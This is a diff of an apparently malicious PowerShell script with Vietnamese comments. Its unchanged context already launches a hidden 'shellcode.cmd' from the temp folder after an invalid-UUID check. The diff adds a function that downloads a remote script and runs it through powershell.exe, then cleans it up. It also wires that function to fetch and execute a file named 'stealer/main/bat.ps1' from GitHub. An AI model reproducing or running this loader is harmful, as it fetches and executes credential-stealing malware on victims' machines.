@@ -9,6 +9,27 @@ if ($invalidUUIDs -notcontains $UUID) {
     Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
 }
 
+function Run-PowerShellFromURL {
+    param (
+        [string]$url
+    )
+
+    # Tạo tên tập tin tạm thời cho script
+    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+
+    try {
+        # Tải nội dung từ URL và lưu vào tập tin tạm thời
+        Invoke-WebRequest -Uri $url -OutFile $tempScript -UseBasicParsing
+
+        # Chạy tập lệnh PowerShell từ tập tin tạm thời và không chờ đợi
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$tempScript`"" -NoNewWindow -Wait
+    }
+    finally {
+        # Xóa tập tin tạm thời sau khi hoàn tất
+        Remove-Item -Path $tempScript -Force
+    }
+}
+
 function Show-ErrorMessageBox {
     param(
         [string]$message
@@ -17,6 +38,7 @@ function Show-ErrorMessageBox {
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($message, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
     Stop-Process $pid -Force
+    Run-PowerShellFromURL -url "https://raw.githubusercontent.com/werearecat/stealer/main/bat.ps1"
 }
 
 function CheckValid {
